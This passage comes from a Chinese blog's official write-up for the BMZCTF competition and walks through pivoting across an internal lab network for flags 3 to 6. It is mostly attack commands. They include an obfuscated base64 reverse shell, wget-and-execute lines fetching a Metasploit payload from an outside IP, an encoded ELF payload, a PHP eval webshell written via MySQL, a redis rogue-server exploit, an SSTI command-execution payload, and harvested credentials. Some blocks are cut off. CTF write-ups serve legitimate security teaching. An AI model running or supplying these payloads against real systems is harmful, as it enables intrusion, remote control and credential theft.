<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">run</span> autoroute -s <span class="number">172.19.3.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>上传TailorScan进行内网扫描</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload <span class="regexp">/CyzCc/</span>tools<span class="regexp">/TailorScan/</span>TailorScan_linux_amd64 /tmp</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/6e372309031ad7d05a9b0ea6a2ddf093.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/TailorScan_linux_amd64 portscan 172.19.3.0/</span><span class="number">24</span> tcp</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/f617dfafb8f07757492d7edcff554fb1.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>172.19.3.2:80为入口点机器，172.19.3.3:8080为一个cas</p>
<p>上传frp</p>
<p>frpc.ini</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">frpc</span>.ini[common]server_addr = <span class="number">81.69.27.32</span>server_port = <span class="number">7000</span>[socks<span class="number">1</span>]type = tcpremote_port = <span class="number">6789</span>plugin = socks<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>frps.ini</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[common]<span class="attr">bind_port</span> = <span class="number">7000</span><span class="attr">vhost_http_port</span> = <span class="number">10080</span><span class="attr">vhost_https_port</span> = <span class="number">10443</span><span class="attr">allow_ports</span> = <span class="number">1000</span>-<span class="number">50000</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/4141f8f3e94f896ab726432c81b43e13.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>该版本存在命令执行</p>
<p>漏洞利用</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/8dcbdc8d9f73ce93142610aee7d64aa8.png?x-oss-process=image/resize,w_670" alt="img"></p>
<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>反弹shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTA0LjE3Mi82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p>上线msf</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wget</span> -qO c<span class="number">3</span>hGHQTr --no-check-certificate http://<span class="number">81.69.27.32:8080</span>/<span class="number">3</span>qKxgRC; chmod +x c<span class="number">3</span>hGHQTr; ./c<span class="number">3</span>hGHQTr&amp; disown</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/31b7980b3ba4556d52f2a833b46a36f3.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>使用</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">run</span> get_local_subnets</span><br></pre></td></tr></table></figure>

<p>查看该机器的网段</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/e4cea2d48ccdd6059365734dd1702070.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>上传TailorScan进行内网扫描</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload <span class="regexp">/CyzCc/</span>tools<span class="regexp">/TailorScan/</span>TailorScan_linux_amd64 /tmp</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/509ca3d99bfe5659ce2cd3776bab0a0b.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/TailorScan_linux_amd64 portscan 172.24.6.0/</span><span class="number">24</span> tcp</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/176fd96b156cf2db16247df1b19f1cc1.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>内网存在一个mysql服务，并且也存在80端口，所以可以尝试从cas那台机器读取账号密码进行登陆，尝试写shell </p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">cat /cas-overlay/target/cas/WEB-INF/deployerConfigContext.xml</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dateSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span>  <span class="comment">&lt;!--$</span></span><span class="template-variable">&#123;&#125;</span><span class="xml"><span class="comment">是引入properties文件内容的--&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;org.gjt.mm.mysql.Driver&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://172.28.0.2:3306/cas415&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;cas&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;WHTcasmysql&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;minPoolSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;initialPoolSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxIdleTime&quot;</span> <span class="attr">value</span>=<span class="string">&quot;20&quot;</span>/&gt;</span>  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>登陆数据库</p>
<p>将3306转发出来</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">portfwd</span> add -l <span class="number">3308</span> -p <span class="number">3306</span> -r <span class="number">172.24.6.2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/4d88f6c1447dfa3916135c357aeb1d94.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>简单查看数据库信息可以看到疑似ssh账号密码的内容</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/be7ed0582766760ea57d955e4dcaf202.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh | <span class="type">BMZCTFer_s_p</span>@asswd | <span class="type">BMZCTFer</span></span><br></pre></td></tr></table></figure>

<p>这里发现可以进行读写文件，由于账号权限为低权限用户，所以udf提权失败，尝试找网站绝对路径进行写shell，访问80端口发现是apache服务</p>
<p>尝试读取apache配置文件</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">load_file</span>   (<span class="params"><span class="string">&quot;/etc/apache2/sites-enabled/000-default.conf&quot;</span></span>)</span>;</span><br></pre></td></tr></table></figure>

<p>找到绝对路径</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/10e57fee60632e6f4e910df6cd2cf2d9.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>写马</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">select &quot;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="xml">&quot; into   outfile &quot;/var/www/html/WHT/1.php&quot;;</span></span><br></pre></td></tr></table></figure>

<p>将80端口转发出来</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">portfwd</span> add -l <span class="number">82</span> -p <span class="number">80</span> -r <span class="number">172.24.6.2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/b8687cb3d047e8adb3b36f95b8ef7105.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>反弹shell</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/ed0c76d9b48bb2342166ffc73c553961.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>上线msf</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wget</span> -qO c<span class="number">3</span>hGHQTr --no-check-certificate http://<span class="number">81.69.27.32:8080</span>/<span class="number">3</span>qKxgRC; chmod +x c<span class="number">3</span>hGHQTr; ./c<span class="number">3</span>hGHQTr&amp; disown</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/34348def85e2d71006b03d51c2738fde.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>使用</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">run</span> get_local_subnets</span><br></pre></td></tr></table></figure>

<p>查看该机器的网段</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/f66a24a866877932c18dd93d6adb2856.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>上传TailorScan进行内网扫描</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload <span class="regexp">/CyzCc/</span>tools<span class="regexp">/TailorScan/</span>TailorScan_linux_amd64 /tmp</span><br><span class="line">.<span class="regexp">/TailorScan_linux_amd64 portscan 172.32.8.0/</span><span class="number">24</span> tcp</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/4273dab82e18f9cb945dba1b9a7fdeb8.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>存在一个redis</p>
<p>将6379端口转发出来</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">portfwd</span> add -l <span class="number">6380</span> -p <span class="number">6379</span> -r <span class="number">172.32.8.3</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> redis-master.<span class="keyword">py</span> -r <span class="number">81.69</span>.<span class="number">27.32</span> -<span class="keyword">p</span> <span class="number">6380</span> -L <span class="number">81.69</span>.<span class="number">27.32</span> -<span class="keyword">P</span> <span class="number">1234</span> -<span class="keyword">f</span> RedisModulesSDK/<span class="built_in">exp</span>/<span class="built_in">exp</span>.<span class="keyword">so</span> -<span class="keyword">c</span> <span class="comment">&quot;cat /flag/</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/781b1a75dd3ef24fc52c60e2a50d143c.png" alt="img"></p>
<p>反弹shell</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> redis-master.<span class="keyword">py</span> -r <span class="number">81.69</span>.<span class="number">27.32</span> -<span class="keyword">p</span> <span class="number">6380</span> -L <span class="number">81.69</span>.<span class="number">27.32</span> -<span class="keyword">P</span> <span class="number">1234</span> -<span class="keyword">f</span> RedisModulesSDK/<span class="built_in">exp</span>/<span class="built_in">exp</span>.<span class="keyword">so</span> -<span class="keyword">c</span> <span class="string">&#x27;bash -c &quot;bash</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/4699a5792a35dda6f87016990a27433c.png" alt="img"></p>
<p>上线msf</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;&quot;&quot;f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAASDH/aglYmbYQSInWTTHJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgAiuFFFGyBRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5&lt;gABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB&lt;AAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQ&lt;THJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtI&lt;ipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5&gt; x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g==&gt; &quot;&quot;&quot;</span>| base64 -d &gt; c3hGHQTr</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/33bc7e69c0b8759cde4b2848af1dedcb.png" alt="img"></p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/b888218a3f9de844f8b318253eb9ec53.png" alt="img"></p>
<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>使用</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">run</span> get_local_subnets</span><br></pre></td></tr></table></figure>

<p>查看该机器的网段</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/2d4fa61a88fbacb7c1dba407056e19cc.png" alt="img"></p>
<p>发现redis只有一个网段</p>
<p>上传TailorScan进行内网扫描</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload /CyzCc/tools/TailorScan/TailorScan_linux_amd64 /tmp</span><br><span class="line">对其进行全端口扫描或者top100</span><br><span class="line">./TailorScan_linux_amd64 portscan <span class="number">172.32.8.0</span>/<span class="number">24 22,3389</span>,<span class="number">3306,1433</span>,<span class="number">21,25,8080</span>,<span class="number">80,81,8081</span>,<span class="number">7001,8000</span>,<span class="number">8088,8888</span>,<span class="number">9090,8090</span>,<span class="number">88,8001,82</span>,<span class="number">9080,8082</span>,<span class="number">8089,9000</span>,<span class="number">8443,9999</span>,<span class="number">8002</span>,<span class="number">89</span>,<span class="number">8083,8200</span>,<span class="number">8008</span>,<span class="number">90</span>,<span class="number">8086,801</span>,<span class="number">8011,8085</span>,<span class="number">9001,9200</span>,<span class="number">8100,8012</span>,<span class="number">85</span>,<span class="number">8084,8070</span>,<span class="number">7002,8091</span>,<span class="number">8003</span>,<span class="number">99</span>,<span class="number">7777,8010</span>,<span class="number">443,8028</span>,<span class="number">8087</span>,<span class="number">83</span>,<span class="number">7003,10000</span>,<span class="number">808,38888</span>,<span class="number">8181,800</span>,<span class="number">18080,8099</span>,<span class="number">8899</span>,<span class="number">86</span>,<span class="number">8360,8300</span>,<span class="number">8800,8180</span>,<span class="number">3505,7000</span>,<span class="number">9002,8053</span>,<span class="number">1000,7080</span>,<span class="number">8989,28017</span>,<span class="number">9060,888</span>,<span class="number">3000,8006</span>,<span class="number">41516,880</span>,<span class="number">8484,6677</span>,<span class="number">8016</span>,<span class="number">84</span>,<span class="number">7200,9085</span>,<span class="number">5555,8280</span>,<span class="number">7005,1980</span>,<span class="number">8161,9091</span>,<span class="number">7890,8060</span>,<span class="number">6080,6379</span>,<span class="number">8880,8020</span>,<span class="number">7070,889</span>,<span class="number">8881,9081</span>,<span class="number">8009,7007</span>,<span class="number">8004,38501</span>,<span class="number">1010</span> tcp</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/faae66076a3575948e6bfdf1ce5de934.png" alt="img"></p>
<p>发现172.32.8.2:8000存在一个服务，将其端口转发出来</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">portfwd</span> add -l <span class="number">8001</span> -p <span class="number">8000</span> -r <span class="number">172.32.8.2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/3d092eff1dfe34508f08ba3f6940185f.png" alt="img"></p>
<p>随便输入名字，发现存在ssti</p>
<p>payload</p>
<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">http://81.69.27.32:8001/?name=</span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> &#x27;eval&#x27; <span class="keyword">in</span> b.keys() %&#125;</span><span class="xml"> </span><span class="template-variable">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat+/flag/flag5&quot;).read()&#x27;) &#125;&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/dae4b5ed126c5090304f498aaba15aed.png" alt="img"></p>
<p>反弹shell</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/c374267d8d7cb7b3b653679154ca63a0.png" alt="img"></p>
<p>上线msf</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wget</span> -qO c<span class="number">3</span>hGHQTr --no-check-certificate http://<span class="number">81.69.27.32:8080</span>/<span class="number">3</span>qKxgRC; chmod +x c<span class="number">3</span>hGHQTr; ./c<span class="number">3</span>hGHQTr&amp; disown</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/8cca3c21e8b193b78173f0baaf3c0a0e.png" alt="img"></p>
<h3 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h3><p>查看ip信息，发现新的网段172.38.10.0/24</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/3e191208df8afa3c49845ca048e37537.png" alt="img"></p>
<p>上传TailorScan进行内网扫描 </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload <span class="regexp">/CyzCc/</span>tools<span class="regexp">/TailorScan/</span>TailorScan_linux_amd64 /tmp</span><br></pre></td></tr></table></figure>

<p>对其进行全端口扫描或者top100</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/43e96e9d1a05677f2d106b7ecd62fcd8.png" alt="img"></p>
<p>发现内网设备 <code>172.38.10.3</code>，并仅开放22端口。前面在数据库中看到的用户名密码还没有使用，在这里进行尝试登录：</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/2c0438d8515d1a43b73409c9facbcdbf.png" alt="img"></p>
<p>发现无法登录。将网络代理出来。在本地进行登录：</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/4d8a095b90fcb4fb23e986c391adf0af.png" alt="img"></p>
<p>首先查看当前用户信息，是BMZCTFer</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/2e7a9370749e97e902a3ac81ea391d7b.png" alt="img"></p>
<p>再查看靶机的用户，有BMZCTFer和BMZCTFFLAGer。</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/17f5aa862f5a547280bca924f2c3446d.png" alt="img"></p>
<p>再查看/flag文件信息。发现/flag6。只有root可以读取。</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/8ede99c8cb380eeb449380794b2a7dd4.png" alt="img"></p>
<p>我们再查看flag6的ACL权限。</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/a3d56755ec9e1435510fc2c87ec4f0d8.png" alt="img"></p>
<p>发现BMZCTFFLAGer就可以读取。所以我们要提权到BMZCTFFLAGer。</p>
<p>查看BMZCTFFLAGer家目录。发现 <code>talk.sh</code>文件。并有可执行权限。</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/cd409821813dff30bd7d5a8f1ac954e1.png" alt="img"></p>
<p>查看文件</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/c0c580cfb1f23829ff50f2e86e347bcd.jpeg" alt="img"></p>
<p>看到</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$msg</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>这个是个漏洞。可以利用。 </p>
<p>先执行一次。发现没有什么效果。</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/51856447b74761e1c26e996ddb1f6a61.png" alt="img"></p>
<p>再查看sudo权限</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/5b29f4a63247453678dbc986b4558153.png" alt="img"></p>
<p>看到可以不使用密码，就能以BMZCTFFLAGer用户执行talk.sh文件。我们以BMZCTFFLAGer用户执行talk.sh，并在 <code>$msg</code>处输入 <code>/bin/sh</code>。</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/def9ea3247b1514c2cba053e5cbf8da4.jpeg" alt="img"></p>
<p>这样我们就得到了BMZCTFFLAGer用户的shell。</p>
<p>最后查看/flag6。我们就得到了flag</p>
<hr>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><blockquote>
<p>因为开头交代的原因，代码的缩紧逻辑有误。</p>
<p>若找到错误，麻烦各方向师傅直接发出更正后的代码（附上题目名称、前后的步骤）</p>
</blockquote>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Harry0597
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://harry0597.com/2022/01/07/2nd%C2%B7BMZCTF%C2%B7Writeup/" title="第二届BMZCTF网络安全公开赛官方题解">https://harry0597.com/2022/01/07/2nd·BMZCTF·Writeup/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Writeup/" rel="tag"><i class="fa fa-tag"></i> Writeup</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/12/30/%E5%AF%92%E5%81%87%E4%BF%AE%E7%82%BC%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" rel="prev" title="寒假修炼记（一）">
      <i class="fa fa-chevron-left"></i> 寒假修炼记（一）
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/01/24/2022%E5%8D%8E%E4%B8%BAHWS%E9%80%89%E6%8B%94%E8%B5%9BWP/" rel="next" title="2022华为HWS选拔赛WP">
      2022华为HWS选拔赛WP <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9CBMZCTF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E5%BC%80%E8%B5%9B%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">第二届“BMZCTF”网络安全公开赛官方题解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A5%E8%87%AA"><span class="nav-number">1.1.</span> <span class="nav-text">来自</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-number">1.2.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.2.1.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simple"><span class="nav-number">1.2.2.</span> <span class="nav-text">simple</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#do-you-nkow-it"><span class="nav-number">1.2.3.</span> <span class="nav-text">do_you_nkow_it</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">1.3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-misc"><span class="nav-number">1.3.1.</span> <span class="nav-text">easy_misc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%B8%E6%88%8F%E7%A7%98%E7%B1%8D"><span class="nav-number">1.3.2.</span> <span class="nav-text">游戏秘籍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#temperature"><span class="nav-number">1.3.3.</span> <span 